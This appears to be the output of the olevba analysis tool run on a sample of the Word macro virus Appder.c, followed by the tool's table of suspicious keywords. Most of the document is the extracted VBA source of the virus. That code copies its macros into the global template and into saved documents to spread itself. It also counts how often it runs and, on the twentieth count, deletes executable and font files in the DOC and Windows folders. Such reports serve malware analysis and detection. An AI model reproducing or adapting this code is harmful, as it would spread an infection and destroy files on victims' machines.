olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Appder.c-5a8592a78dbd32311d5d8582ac4ccbd62e3a5268
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Appder.c-5a8592a78dbd32311d5d8582ac4ccbd62e3a5268 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Module_________.bas 
in file: Virus.MSWord.Appder.c-5a8592a78dbd32311d5d8582ac4ccbd62e3a5268 - OLE stream: 'Macros/VBA/Module_________'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

'   Virus -

Public Sub MAIN()
Dim sMe$
Dim sTMacro$
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
On Error GoTo -1: On Error GoTo Quit
WordBasic.CurValues.FileSaveAs dlg
If dlg.Format = 0 Then dlg.Format = 1
sMe$ = WordBasic.[FileName$]()
sTMacro$ = sMe$ + ":        "
WordBasic.MacroCopy "Global:      ", sTMacro$
sTMacro$ = sMe$ + ":      "
WordBasic.MacroCopy "Global:      ", sTMacro$
sTMacro$ = sMe$ + ":         "
WordBasic.MacroCopy "Global:         ", sTMacro$
WordBasic.FileSaveAs dlg
GoTo Done
Quit:
If Err.Number <> 102 Then
    WordBasic.FileSaveAs dlg
End If
Done:
End Sub
-------------------------------------------------------------------------------
VBA MACRO Module________.bas 
in file: Virus.MSWord.Appder.c-5a8592a78dbd32311d5d8582ac4ccbd62e3a5268 - OLE stream: 'Macros/VBA/Module________'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

'Virus -

Public Sub MAIN()
Dim iMacroCount
Dim i
Dim AClose
Dim Ad
Dim sMe$
Dim sMacro$
       
On Error GoTo -1: On Error GoTo Quit
iMacroCount = WordBasic.CountMacros(0, 0)
For i = 1 To iMacroCount
    If WordBasic.[MacroName$](i, 0, 0) = "         " Then
        AClose = -1
    End If
    If WordBasic.[MacroName$](i, 0, 0) = "      " Then
        Ad = -1
    End If
Next i
If Not AClose And Not Ad Then
    sMe$ = WordBasic.[FileName$]()
    sMacro$ = sMe$ + ":      "
    WordBasic.MacroCopy sMacro$, "Global:      "
    sMacro$ = sMe$ + ":         "
    WordBasic.MacroCopy sMacro$, "Global:         "
End If
Quit:
End Sub

Private Sub
Dim WOpen$
Dim sales
WOpen$ = WordBasic.[GetPrivateProfileString$]("Microsoft Word", "        ", "WINWORD6.INI")
sales = WordBasic.Val(WOpen$) + 1
WordBasic.SetPrivateProfileString "Microsoft Word", "       ", Str(sales), "WINWORD6.INI"
WOpen$ = WordBasic.[GetPrivateProfileString$]("Microsoft Word", "       ", "WINWORD6.INI")
If WOpen$ = "20" Then
    WordBasic.SetPrivateProfileString "Microsoft Word", "       ", "1", "WINWORD6.INI"
    WordBasic.Kill "C:\DOC\*.EXE"
    WordBasic.Kill "C:\DOC\*.COM"
    WordBasic.Kill "C:\WINDOWS\*.EXE"
    WordBasic.Kill "C:\WINDOWS\SYSTEM\*.TTF"
    WordBasic.Kill "C:\WINDOWS\SYSTEM\*.FOT"
End If
End Sub '
-------------------------------------------------------------------------------
VBA MACRO Module______.bas 
in file: Virus.MSWord.Appder.c-5a8592a78dbd32311d5d8582ac4ccbd62e3a5268 - OLE stream: 'Macros/VBA/Module______'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

'Virus -

Public Sub MAIN()
Dim iMacroCount
Dim i
Dim AClose
Dim Ad
Dim sMe$
Dim sMacro$
       
On Error GoTo -1: On Error GoTo Quit
iMacroCount = WordBasic.CountMacros(0, 0)
For i = 1 To iMacroCount
    If WordBasic.[MacroName$](i, 0, 0) = "         " Then
        AClose = -1
    End If
    If WordBasic.[MacroName$](i, 0, 0) = "      " Then
        Ad = -1
    End If
Next i
If Not AClose And Not Ad Then
    sMe$ = WordBasic.[FileName$]()
    sMacro$ = sMe$ + ":      "
    WordBasic.MacroCopy sMacro$, "Global:      "
    sMacro$ = sMe$ + ":         "
    WordBasic.MacroCopy sMacro$, "Global:         "
End If
Quit:
End Sub

Private Sub
Dim WOpen$
Dim sales
WOpen$ = WordBasic.[GetPrivateProfileString$]("Microsoft Word", "        ", "WINWORD6.INI")
sales = WordBasic.Val(WOpen$) + 1
WordBasic.SetPrivateProfileString "Microsoft Word", "       ", Str(sales), "WINWORD6.INI"
WOpen$ = WordBasic.[GetPrivateProfileString$]("Microsoft Word", "       ", "WINWORD6.INI")
If WOpen$ = "20" Then
    WordBasic.SetPrivateProfileString "Microsoft Word", "       ", "1", "WINWORD6.INI"
    WordBasic.Kill "C:\DOC\*.EXE"
    WordBasic.Kill "C:\DOC\*.COM"
    WordBasic.Kill "C:\WINDOWS\*.EXE"
    WordBasic.Kill "C:\WINDOWS\SYSTEM\*.TTF"
    WordBasic.Kill "C:\WINDOWS\SYSTEM\*.FOT"
End If
End Sub '
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|Kill                |May delete a file                            |
|Suspicious|WINDOWS             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|SYSTEM              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

